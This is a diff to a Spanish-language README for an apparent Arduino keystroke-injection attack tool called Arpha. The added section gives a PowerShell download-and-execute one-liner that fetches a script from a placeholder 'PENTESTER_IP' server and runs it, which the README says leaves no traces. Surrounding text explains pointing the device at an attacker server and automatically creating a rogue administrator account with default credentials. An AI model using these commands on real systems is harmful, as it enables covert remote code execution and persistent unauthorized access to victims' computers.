@@ -13,6 +13,12 @@ En la linea 28 del Archivo *Arpha.ino* se configura la linea de comando a correr
 <br><br><br>![COMMAND](https://raw.githubusercontent.com/mrx04programmer/Arpha/master/img/command.png)
 Y en el campo donde se encuentra **'ATTACKER_IP_SERVER'** es donde se debe cambiar por la ip del servidor a enviar la petición y posteriormente su puerto especifico.
 
+**Command Remote Powershell**
+Logra descargar archivos remotos y ejecutarlos, sin dejar pistas por medio de powershell. Para configurar correctamente el archivo, se deberá cambiar el campo de **'https://PENTESTER_IP:PORT/File.ps1'** por la dirección correcta del servidor, puerto y ruta del archivo de powershell con extensión *ps1*.
+```
+Keyboard.print("iex (new-object net.webclient).downloadstring('https://PENTESTER_IP:PORT/File.ps1')");
+```
+
 **Escalation Privileges**
 Lista de comandos que se ejecutaran automaticamente para lograr la escalación de privilegios y crear un usuario ficticio con privilegios de Administrador.
 Su configuración es simple. por defecto el nombre del usuario a crear con los privilegios se llamará 'testing' y su contraseña 'cood', sin embargo estos son preferibles cambiarlos según el entorno de ataque. (Linea 37 - Escalation_Privileges.ino)
